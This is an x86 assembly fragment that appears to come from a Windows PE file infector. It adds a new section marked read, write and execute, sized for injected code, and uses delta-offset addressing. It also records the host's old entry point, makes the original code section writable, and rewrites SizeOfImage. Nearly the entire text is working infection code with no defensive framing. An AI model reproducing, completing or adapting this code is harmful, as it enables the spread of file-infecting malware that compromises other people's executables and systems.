; CREATE NEW SECTION HEADER
; COPY FIRST ONE INTO NEW ONE
mov	ecx, 020h
mov	edi, esi ; Destination bytes
mov	esi, [DELTA PeStartSHeader] ; Source bytes
mov	ebx, edi ; Keep start of new header
CreateNewHeader:
lodsb
stosb
loop	CreateNewHeader

; INCREMENT NUMBER OF SECTION
xor	eax, eax
mov	edi, [DELTA PePSectionNb]
mov	ax, word ptr [edi]
inc	eax
mov	ecx, [DELTA PePSectionNb]
mov	word ptr [ecx], ax

; COPY THE NAME
mov	ecx, 08h ; Length of Name
mov	esi, offset NewSectionName ; Source bytes
add	esi, ebp
mov	edi, ebx ; Destination bytes
pusha ; Keep registers
CopySectionName:
lodsb
stosb
loop CopySectionName

; Virtual Size
popa	; Retrieve registers
add	edi, 08h
mov	[DELTA NewSectionCodeSize], endInject - toInject ; Size of actual code in new section
mov	ecx, [DELTA NewSectionCodeSize]
mov	[edi], ecx

; Virtual Address
add	edi, 04h
mov	ecx, [DELTA LastSecHeader]
add	ecx, 08h ; LastSecHeader.VirtualSize
mov	eax, [ecx]
add	ecx, 04h ; LastSecHeader.VirtualAdress
mov	ebx, ecx ; Keep VAddress for Raw data
add	eax, [ecx]
; pImageSectionHeader->VirtualAddress = (((EndSections - 1) / SectionAlignment) + 1) * SectionAlignment;
sub eax, 1
xor	edx, edx
div	[DELTA SectionAlignment] ; divide eax by SectionAlignement
add	eax, 1
mul	[DELTA SectionAlignment]
mov	[edi], eax
mov	[DELTA VirtualAddress], eax
mov	esi, eax ; Keep New VA for EntryPoint

; Size of raw data
add	edi, 04h
mov	eax, [DELTA NewSectionCodeSize]
sub	eax, 1
xor	edx, edx
div	[DELTA FileAlignment] ; divide eax by FileAlignment
add	eax, 1
mul	[DELTA FileAlignment]
mov	[edi], eax
mov	[DELTA SizeOfRawData], eax

; Pointer to raw data (Get last section pointer to raw data + size of raw data)
add	edi, 04h
mov	ecx, ebx
add	ecx, 04h
mov	eax, [ecx]
add	ecx, 04h
add	eax, [ecx]
mov	[edi], eax
mov	[DELTA PointerToRawData], eax

; Characteristics
add	edi, 010h
mov	ecx, IMAGE_SCN_MEM_READ
or	ecx, IMAGE_SCN_MEM_WRITE
or	ecx, IMAGE_SCN_MEM_EXECUTE
or	ecx, IMAGE_SCN_CNT_CODE
mov	[edi], ecx
; Same thing for our old entry point (+ Get some values)
; Get VA of old code
mov	edx, [DELTA CodeSecHeader]
add	edx, 0Ch
mov	eax, [edx]
mov	[DELTA CodeSecVA], eax
; Get Ptr Raw data
add	edx, 08h
mov	eax, [edx]
mov	[DELTA CodeSecRawData], eax
; Getting the offset between the entry point and the section
mov	eax, [DELTA OldEntryPoint]
sub	eax, [DELTA CodeSecVA]
mov	[DELTA OffsetCodeSecEP], eax
mov	eax, [DELTA OffsetCodeSecEP]
; Characteristics
add	edx, 010h
mov	[edx], ecx


; CHANGE PE PROPERTIES
mov	eax, [DELTA PeNtHeader]
add	eax, 01Ch
; CHANGE ENTRY POINT
add	eax, 0Ch
mov	edi, [eax]
; mov	[eax], esi
; CHANGE SIZE OF IMAGE
xor	edi, edi
getSizeRawDataAligned:
cmp	[DELTA SizeOfRawData], edi
jl	SizeOfCodeSectionDone
add	edi, [DELTA SectionAlignment]
loop	getSizeRawDataAligned
SizeOfCodeSectionDone:
add	eax, 028h
add	ebx, 08h
add	esi, edi
mov	[eax], esi
; CLOSE
PVDELTA	PeFileMap
call	[DELTA pUnmapViewOfFile]
PVDELTA	PeMapObject
call	[DELTA pCloseHandle]
